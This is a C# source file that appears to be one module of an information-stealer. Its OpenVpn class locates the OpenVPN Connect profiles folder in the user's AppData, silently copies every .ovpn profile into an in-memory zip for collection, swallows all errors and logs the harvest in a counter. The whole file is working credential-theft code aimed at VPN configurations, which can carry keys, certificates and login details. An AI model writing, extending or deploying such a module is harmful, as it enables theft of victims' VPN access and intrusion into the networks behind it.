using System;
using System.IO;
using System.Threading.Tasks;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn;

public class OpenVpn : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect", "profiles");
		if (!Directory.Exists(text))
		{
			return;
		}
		Counter.CounterApplications counterApplications = new Counter.CounterApplications();
		counterApplications.Name = "OpenVPN";
		Parallel.ForEach(Directory.GetFiles(text), delegate(string file)
		{
			try
			{
				if (!(Path.GetExtension(file) != ".ovpn"))
				{
					string entryPath = "OpenVpn\\" + Path.GetFileName(file);
					zip.AddFile(entryPath, File.ReadAllBytes(file));
				}
			}
			catch
			{
			}
		});
		counterApplications.Files.Add(text + " => OpenVpn");
		counterApplications.Files.Add("OpenVpn\\");
		counter.Vpns.Add(counterApplications);
	}
}
